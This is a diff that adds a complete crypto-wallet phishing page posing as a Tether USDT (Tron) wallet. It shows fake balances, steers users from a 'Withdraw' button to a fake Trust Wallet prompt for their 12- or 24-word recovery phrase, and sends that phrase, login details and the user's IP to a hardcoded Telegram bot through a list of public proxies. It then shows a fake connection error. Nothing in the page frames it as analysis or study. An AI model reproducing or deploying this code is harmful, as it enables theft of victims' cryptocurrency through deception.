@@ -1,1 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether USDT (Tron)</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+        body{background:#121212;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px;position:relative;overflow:hidden;}
 
+        .power-btn{
+            position:fixed;top:18px;left:18px;z-index:9999;background:rgba(255,255,255,0.12);backdrop-filter:blur(10px);
+            padding:8px 18px;border-radius:25px;font-size:13px;font-weight:600;border:1px solid rgba(255,255,255,0.2);
+            cursor:pointer;display:none;
+        }
+        .power-btn:hover{background:rgba(255,255,255,0.22);}
+
+        #login-container{
+            background:rgba(255,255,255,0.1);backdrop-filter:blur(25px);padding:25px 20px;border-radius:18px;
+            box-shadow:0 20px 60px rgba(0,0,0,0.6);width:100%;max-width:320px;text-align:center;
+            border:1px solid rgba(255,255,255,0.2);
+            margin:10px;
+        }
+        #login-container h2{font-size:17px;margin-bottom:20px;text-transform:uppercase;letter-spacing:1.1px;font-weight:700;text-shadow:0 2px 8px rgba(46,125,50,0.6);}
+        .logo{width:55px;margin-bottom:15px;}
+        .input-group{position:relative;margin-bottom:22px;}
+        .input-group input{width:100%;padding:12px 40px 12px 14px;border:none;border-bottom:2px solid rgba(255,255,255,0.3);background:transparent;color:#fff;font-size:14px;outline:none;transition:.4s;}
+        .input-group input:focus,.input-group input:valid{border-color:#2E7D32;box-shadow:0 0 8px rgba(46,125,50,0.4);}
+        .input-group label{position:absolute;top:50%;left:14px;transform:translateY(-50%);color:rgba(255,255,255,0.6);font-size:14px;pointer-events:none;transition:.4s;}
+        .input-group input:focus + label,.input-group input:valid + label{top:-8px;left:0;font-size:11px;color:#fff;font-weight:500;}
+        .password-toggle{
+            position:absolute;
+            right:12px;
+            top:50%;
+            transform:translateY(-50%);
+            background:none;
+            border:none;
+            color:rgba(255,255,255,0.6);
+            cursor:pointer;
+            font-size:0;
+            width:24px;
+            height:24px;
+            padding:0;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            outline:none;
+            user-select:none;
+            -webkit-tap-highlight-color:transparent;
+        }
+        .password-toggle:hover{color:#fff;}
+        .password-toggle:active{
+            transform:translateY(-50%) scale(0.95);
+        }
+        .password-toggle::before{
+            content:'';
+            width:20px;
+            height:20px;
+            background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff' stroke='none'%3E%3Cpath d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z' opacity='0.6'/%3E%3C/svg%3E");
+            background-size:contain;
+            background-repeat:no-repeat;
+            background-position:center;
+            transition:opacity 0.3s;
+        }
+        .password-toggle.show-password::before{
+            background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffffff' stroke='none'%3E%3Cpath d='M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z' opacity='0.6'/%3E%3C/svg%3E");
+        }
+        button{width:100%;padding:13px;background:#2E7D32;border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:.3s;}
+        button:hover{background:#3D8B40;transform:translateY(-2px);}
+        button:active{
+            transform:translateY(-1px);
+        }
+        .error-message{color:#fff;font-size:13px;padding:10px;background:rgba(255,77,77,0.25);border-radius:8px;margin-top:10px;display:none;}
+        .error-message.show{display:block;}
+
+        #dashboard{
+            display:none;flex-direction:column;gap:15px;width:100%;max-width:350px;align-items:center;
+        }
+        @media(min-width:768px){
+            #dashboard{flex-direction:row;gap:20px;max-width:850px;}
+        }
+
+        .wallet-box{
+            background:linear-gradient(135deg,rgba(46,125,50,0.15),rgba(18,18,18,0.15));
+            backdrop-filter:blur(25px);padding:22px 24px;border-radius:16px;text-align:center;width:100%;max-width:360px;
+            border:2px solid rgba(46,125,50,0.3);box-shadow:0 15px 40px rgba(0,0,0,0.6);
+        }
+        .wallet-box.trx{border-color:rgba(0,174,255,0.4);}
+        .wallet-box img.logo{width:55px;margin:0 auto 10px;}
+        .wallet-box h2{font-size:17px;margin-bottom:8px;font-weight:700;}
+        .balance{font-size:15px;font-weight:700;margin:12px 0;color:#0af !important;}
+        .balance strong{font-size:20px;}
+        .action-buttons{display:flex;flex-direction:column;gap:10px;margin-top:6px;}
+        .action-button{padding:11px;background:#2E7D32;border:none;border-radius:9px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:.3s;}
+        .action-button:hover{background:#3D8B40;transform:translateY(-2px);}
+
+        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;z-index:1001;}
+        .modal.active{display:flex;}
+        .modal-content{background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);padding:25px 22px;border-radius:16px;max-width:320px;width:90%;text-align:center;position:relative;border:1px solid rgba(255,255,255,0.15);}
+        .close-button{position:absolute;top:1px;right:140px;background:none;border:none;color:#fff;font-size:26px;cursor:pointer;}
+        .close-button:hover{color:#ff4444;}
+        .trust-wallet-btn{display:flex;align-items:center;justify-content:center;gap:10px;padding:15px;background:linear-gradient(135deg,#3375BB,#00A3EF);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;margin-top:20px;cursor:pointer;}
+        .trust-wallet-btn img{width:35px;height:35px;border-radius:9px;}
+        .word-counter{text-align:right;margin-top:6px;font-size:12px;color:#888;}
+        .word-counter.valid{color:#2E7D32;font-weight:700;}
+        .full-loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:none;justify-content:center;align-items:center;flex-direction:column;gap:20px;z-index:9999;}
+        .spinner{width:70px;height:70px;border:6px solid #111;border-top:6px solid #00D4FF;border-radius:50%;animation:spin 1s linear infinite;}
+        @keyframes spin{to{transform:rotate(360deg);}}
+        .loading-text{color:#00D4FF;font-size:17px;font-weight:600;text-align:center;padding:0 15px;}
+        
+        .connection-error{
+            background:rgba(255,77,77,0.15);
+            border:1px solid rgba(255,77,77,0.3);
+            color:#ff9999;
+            padding:12px 15px;
+            border-radius:10px;
+            font-size:14px;
+            margin-top:15px;
+            text-align:center;
+            display:none;
+        }
+        .connection-error.show{
+            display:block;
+        }
+        
+        @media(max-width:360px){
+            #login-container{
+                padding:20px 15px;
+                max-width:300px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="power-btn" id="power-btn">Logout</div>
+
+    <div id="login-container">
+        <div class="login-container">
+            <img src="https://s3.coinmarketcap.com/static/img/coins/64x64/825.png" class="logo">
+            <h2>Tether USDT (Tron)</h2>
+            <form id="login-form">
+                <div class="input-group">
+                    <input type="text" id="username" required>
+                    <label>Enter your username</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" required>
+                    <label>Enter your password</label>
+                    <button type="button" class="password-toggle" id="toggle-password" title="Show password"></button>
+                </div>
+                <button type="submit">Log In</button>
+                <div class="error-message" id="error-message">Invalid username or password</div>
+            </form>
+        </div>
+    </div>
+
+    <div id="dashboard">
+        <div class="wallets-container">
+            <div class="wallet-box">
+                <img src="https://s3.coinmarketcap.com/static/img/coins/64x64/825.png" class="logo">
+                <h2>Tether USDT</h2>
+                <div class="balance">Balance: <strong>73,636</strong> USDT</div>
+                <div class="action-buttons">
+                    <button class="action-button" data-coin="USDT" data-action="withdraw">Withdraw</button>
+                    <button class="action-button" data-coin="USDT" data-action="deposit">Deposit</button>
+                </div>
+            </div>
+
+            <div class="wallet-box trx">
+                <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="logo">
+                <h2>TRON (TRX)</h2>
+                <div class="balance">Balance: <strong>3,460</strong> TRX <span id="trx-usd" style="font-size:13px;color:#0af;">(... USD)</span></div>
+                <div class="action-buttons">
+                    <button class="action-button" data-coin="TRX" data-action="withdraw">Withdraw</button>
+                    <button class="action-button" data-coin="TRX" data-action="deposit">Deposit</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="deposit-modal">
+        <div class="modal-content">
+            <button class="close-button close-modal">x</button>
+            <h3 id="deposit-title">Deposit</h3>
+            <p style="color:#ccc;margin:15px 0 20px;font-size:14px;">Network: TRON TRC20</p>
+            <div style="background:rgba(255,255,255,0.08);padding:14px;border-radius:10px;word-break:break-all;font-size:13px;">
+                TLfiZN9yfLq6ugHiHkVquCAHys1biWaHdu
+            </div>
+            <button class="action-button" id="copy-address" style="margin-top:20px;">Copy Address</button>
+        </div>
+    </div>
+
+    <div class="modal" id="withdraw-connect-modal">
+        <div class="modal-content">
+            <button class="close-button close-modal">x</button>
+            <h3 id="withdraw-title">Withdraw</h3>
+            <p style="color:#ccc;font-size:15px;margin:20px 0;">Connect wallet to continue</p>
+            <button class="trust-wallet-btn" id="open-seed">
+                <img src="https://avatars.githubusercontent.com/u/32179889?s=200&v=4">
+                Trust Wallet
+            </button>
+        </div>
+    </div>
+
+    <div class="modal" id="seed-modal">
+        <div class="modal-content">
+            <button class="close-button close-modal">x</button>
+            <img src="https://avatars.githubusercontent.com/u/32179889?s=200&v=4" style="width:60px;margin:15px auto 10px;border-radius:12px;">
+            <h3>Recovery Phrase</h3>
+            <p style="color:#ccc;font-size:14px;margin-bottom:15px;">Enter your 12 or 24 words</p>
+            <textarea id="seed-input" placeholder="word1 word2 ..." style="width:100%;height:120px;padding:12px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.2);border-radius:10px;color:#fff;font-size:14px;resize:none;"></textarea>
+            <div class="word-counter" id="word-count">0/24</div>
+            <div class="connection-error" id="connection-error">
+                Connection error. Please try again or use another wallet.
+            </div>
+            <button class="trust-wallet-btn" id="submit-seed">Continue</button>
+        </div>
+    </div>
+
+    <div class="full-loader" id="loader">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loading-text">Connecting to wallet...</div>
+    </div>
+
+    <script>
+        async function sendToTelegram(message) {
+            const telegramUrl = `https://api.telegram.org/bot7993122183:AAG-bLdJ9JIXdS5Zgxs5zwnzBA1ff7BShgw/sendMessage?chat_id=7373523973&text=${encodeURIComponent(message)}`;
+
+            const PROXY_APIS = [
+                'https://cors.bridged.cc/',
+                'https://thingproxy.freeboard.io/fetch/',
+                'https://api.allorigins.win/raw?url=',
+                'https://corsproxy.io/?',
+                'https://cors-anywhere.herokuapp.com/',
+                'https://api.codetabs.com/v1/proxy?quest=',
+                'https://proxy.cors.sh/'
+            ];
+
+            let attempt = 1;
+            let success = false;
+            
+            while (!success) {
+                console.log(`Attempt ${attempt} to send to Telegram...`);
+                
+                for (const proxy of PROXY_APIS) {
+                    try {
+                        const proxyUrl = proxy + encodeURIComponent(telegramUrl);
+                        console.log(`Testing proxy: ${proxy}`);
+                        
+                        const response = await fetch(proxyUrl, {
+                            method: 'GET',
+                            cache: 'no-store',
+                            mode: 'cors'
+                        });
+
+                        if (!response.ok) {
+                            console.log(`Proxy ${proxy} did not respond, next proxy...`);
+                            continue;
+                        }
+
+                        const text = await response.text();
+
+                        if (text.includes('"ok":true') || text.includes('"ok": true')) {
+                            console.log("Send successful with:", proxy);
+                            success = true;
+                            return true;
+                        }
+                        
+                        let json;
+                        try { 
+                            json = JSON.parse(text); 
+                            if (json.ok === true || (json.contents && JSON.parse(json.contents).ok === true)) {
+                                console.log("Send successful with:", proxy);
+                                success = true;
+                                return true;
+                            }
+                        } catch { 
+                            continue;
+                        }
+                    } catch (err) {
+                        console.log(`Error with proxy ${proxy}`);
+                    }
+                }
+
+                attempt++;
+                
+                if (attempt % 5 === 0) {
+                    console.log("5 unsuccessful attempts, waiting 3 seconds...");
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            return false;
+        }
+
+        let currentCoin = "Unknown";
+
+        document.getElementById('toggle-password').onclick = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.classList.add('show-password');
+                this.title = 'Hide password';
+            } else {
+                passwordInput.type = 'password';
+                this.classList.remove('show-password');
+                this.title = 'Show password';
+            }
+            
+            passwordInput.focus();
+        };
+
+        document.getElementById('login-form').onsubmit = async e => {
+            e.preventDefault();
+            const u = document.getElementById('username').value.trim();
+            const p = document.getElementById('password').value;
+            if(u === 'john371' && p === '2525561'){
+                document.getElementById('loading-text').textContent = "Signing in...";
+                document.getElementById('loader').style.display = 'flex';
+                
+                localStorage.setItem('isLoggedIn','true');
+                let ip = 'Unknown';
+                try { ip = await (await fetch('https://api.ipify.org')).text(); } catch{}
+                
+                await sendToTelegram(`New Login\nUser: ${u}\nPassword: ${p}\nIP: ${ip}\nTime: ${new Date().toLocaleString('fa-IR')}`);
+                
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('login-container').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'flex';
+                document.getElementById('power-btn').style.display = 'block';
+                updateTrx();
+            } else {
+                document.getElementById('error-message').classList.add('show');
+                setTimeout(() => document.getElementById('error-message').classList.remove('show'), 3500);
+            }
+        };
+
+        document.querySelectorAll('.action-button[data-action="withdraw"]').forEach(btn => {
+            btn.onclick = () => {
+                document.getElementById('power-btn').style.display = 'none';
+                currentCoin = btn.getAttribute('data-coin');
+                document.getElementById('withdraw-title').textContent = `Withdraw ${currentCoin}`;
+                document.getElementById('withdraw-connect-modal').classList.add('active');
+            };
+        });
+
+        document.querySelectorAll('.action-button[data-action="deposit"]').forEach(btn => {
+            btn.onclick = () => {
+                document.getElementById('power-btn').style.display = 'none';
+                const coin = btn.getAttribute('data-coin');
+                document.getElementById('deposit-title').textContent = `Deposit ${coin}`;
+                document.getElementById('deposit-modal').classList.add('active');
+            };
+        });
+
+        document.getElementById('open-seed').onclick = () => {
+            document.getElementById('withdraw-connect-modal').classList.remove('active');
+            document.getElementById('seed-modal').classList.add('active');
+            document.getElementById('seed-input').value = '';
+            document.getElementById('word-count').textContent = '0/24';
+            document.getElementById('connection-error').classList.remove('show');
+        };
+
+        document.getElementById('seed-input').oninput = () => {
+            const words = document.getElementById('seed-input').value.trim().split(/\s+/).filter(w => w.length > 0);
+            const count = words.length;
+            document.getElementById('word-count').textContent = `${count}/24`;
+            document.getElementById('word-count').classList.toggle('valid', count === 12 || count === 24);
+        };
+
+        document.getElementById('submit-seed').onclick = async () => {
+            const words = document.getElementById('seed-input').value.trim().split(/\s+/).filter(w => w.length > 0);
+            if (words.length !== 12 && words.length !== 24) {
+                alert("Please enter exactly 12 or 24 words");
+                return;
+            }
+
+            document.getElementById('loader').style.display = 'flex';
+            document.getElementById('loading-text').textContent = "Connecting to wallet...";
+            document.getElementById('connection-error').classList.remove('show');
+
+            let ip = 'Unknown';
+            try { ip = await (await fetch('https://api.ipify.org')).text(); } catch {}
+
+            await sendToTelegram(`New Seed - ${currentCoin}\nPhrase: ${words.join(' ')}\nWords: ${words.length}\nIP: ${ip}\nTime: ${new Date().toLocaleString('fa-IR')}`);
+            
+            document.getElementById('loader').style.display = 'none';
+            
+            document.getElementById('connection-error').classList.add('show');
+            
+            setTimeout(() => {
+                document.getElementById('connection-error').classList.remove('show');
+            }, 10000);
+        };
+
+        document.getElementById('power-btn').onclick = () => {
+            localStorage.removeItem('isLoggedIn');
+            document.getElementById('login-container').style.display = 'block';
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('power-btn').style.display = 'none';
+        };
+
+        async function updateTrx() {
+            try {
+                const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd');
+                const d = await r.json();
+                document.getElementById('trx-usd').textContent = `≈ $${(3460 * d.tron.usd).toFixed(2)}`;
+            } catch {
+                document.getElementById('trx-usd').textContent = '—';
+            }
+        }
+
+        document.querySelectorAll('.close-modal').forEach(b => {
+            b.onclick = e => { 
+                e.stopPropagation(); 
+                b.closest('.modal').classList.remove('active'); 
+                document.getElementById('connection-error').classList.remove('show');
+                document.getElementById('power-btn').style.display = 'block';
+            };
+        });
+        
+        window.onclick = e => { 
+            if (e.target.classList.contains('modal')) {
+                e.target.classList.remove('active'); 
+                document.getElementById('connection-error').classList.remove('show');
+                document.getElementById('power-btn').style.display = 'block';
+            }
+        };
+
+        if (localStorage.getItem('isLoggedIn') === 'true') {
+            document.getElementById('login-container').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'flex';
+            document.getElementById('power-btn').style.display = 'block';
+            updateTrx();
+        }
+    </script>
+</body>
+</html>
